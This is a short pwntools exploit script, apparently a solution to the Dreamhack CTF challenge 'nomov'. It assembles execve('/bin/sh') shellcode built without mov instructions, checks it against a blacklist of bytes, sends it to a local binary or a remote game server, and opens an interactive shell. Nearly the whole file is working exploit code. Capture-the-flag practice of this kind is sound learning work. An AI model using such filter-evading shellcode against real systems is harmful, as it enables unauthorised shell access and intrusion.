from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/nomov/deploy/main')

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:14508'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()

bad = bytearray.fromhex('A1A08E8C8B8A8988B3B2B1B0A5A4A3A2BBBAB9B8B7B6B5B4BFBEBDBCC7C6')

def is_ok(sc):
    for b in bad:
        if b in sc:
            print(f"bad, found {hex(b)}!")
            return 0
    return 1
    

sc = asm('''
lea rax, [0x0068732f]
shl rax, 32
or rax, 0x6e69622f
push rax

lea rdi, [rsp]

xor rsi, rsi
xor rdx, rdx

lea rax, [0x3b]
syscall
''')

is_ok(sc)
print(sc)

p.send(sc)

p.interactive()
